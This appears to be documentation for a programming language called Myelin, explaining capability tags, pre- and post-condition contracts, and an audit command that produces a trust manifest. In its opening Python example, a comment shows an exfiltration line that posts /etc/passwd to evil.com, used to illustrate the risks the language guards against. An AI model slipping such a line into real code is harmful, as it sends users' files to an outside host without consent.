# Capabilities & Security Model

One of Myelin's core design pillars is **Zero Ambient Authority**. In traditional languages like Python, C#, or JavaScript, any function can secretly read your SSH keys, send network packets, or format your disk:

```python
# Unsafe in Python: does calculate_tax steal your files?
def calculate_tax(income):
    # Could secretly do: requests.post("https://evil.com", data=open("/etc/passwd").read())
    return income * 0.18
```

In Myelin, **pure functions are mathematically isolated**. If a function does not declare a capability, the compiler and runtime physically prevent it from touching system resources.

---

## The Capability Tags (`!`)

Capabilities are declared at the end of a function signature using `!` followed by a dotted identifier:

```myelin
#fn send_invoice [email:str amt:i64] !net.http !db.rw !io
  -- Can use HTTP, database, and standard I/O
```

### Standard Capability Hierarchy

| Capability | Scope | Allowed Operations |
| :--- | :--- | :--- |
| `!io` | Standard Console I/O | `io.println`, printing debugging output |
| `!net` | Network Operations | TCP, UDP, HTTP client/server (`http.serve`) |
| `!db` | Persistent Storage | Read/write access to embedded database (`db.set`, `db.get`) |
| `!fs` | File System | File reading and writing |
| `!clock` | System Clock | Reading wall-clock time and timers |
| `!unsafe.mem` | Raw Pointer Memory | Direct pointer dereferencing and C FFI calls |

---

## Design-by-Contract (`req` and `ens`)

Myelin includes first-class contractual specifications:
- `req <Expr>` (pre-condition): Must be true before the function body executes.
- `ens <Expr>` (post-condition): Must be true when the function returns (uses `ret` to refer to return value).

```myelin
#fn deposit [bal:i64 amt:i64 -> i64]
  req amt > 0
  ens ret > bal
  new_bal = bal + amt
  = new_bal
```

If contracts are violated at runtime, an assertion failure is triggered with source locations, immediately exposing faulty logic.

---

## Trust & Capability Audit (`myelinc audit`)

When AI agents generate thousands of lines of software, human engineers do not need to read every single line of code. Instead, they run:

```bash
myelinc audit src/
```

This outputs a cryptographic **Trust Manifest**:

```text
=== MYELIN TRUST & CAPABILITY MANIFEST ===
Module: finance.settlement
Capabilities Claimed:
  - !db.rw       (Database Read/Write)
  - !net.https   (Outbound TLS Only)

Contracts Verified:
  - 12 functions with strict 'req' & 'ens' proofs
  - Zero unsafe memory operations (!unsafe.mem is absent)
  - Zero ambient file access (!fs is absent)

Security Rating: HIGH TRUST (Verified pure computational pipeline)
```
